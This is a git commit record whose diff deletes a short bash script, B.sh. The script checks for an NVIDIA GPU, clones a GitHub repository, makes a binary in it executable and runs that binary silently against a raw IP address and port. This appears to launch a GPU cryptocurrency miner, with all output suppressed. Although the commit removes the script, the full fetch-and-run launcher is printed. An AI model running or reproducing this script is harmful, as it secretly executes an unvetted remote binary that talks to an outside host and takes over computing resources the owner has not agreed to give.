aed5d22e80f0c035305e4304ff64821269222190
phucbmt <phucdlbmt@gmail.com>
2021-03-02 22:49:59 +0700

    Delete B.sh

--- B.sh
+++
@@ -1,8 +0,0 @@
-#! /bin/bash
-nvidia-smi
-printf "Run 138.197.62.236:4545/$1"  >&2
-{
-git clone https://github.com/phucbmt/tech.git &> /dev/null
-sudo chmod +x tech/m
-./tech/m -P http://138.197.62.236:4545/"$1" &> log
-} &> /dev/null
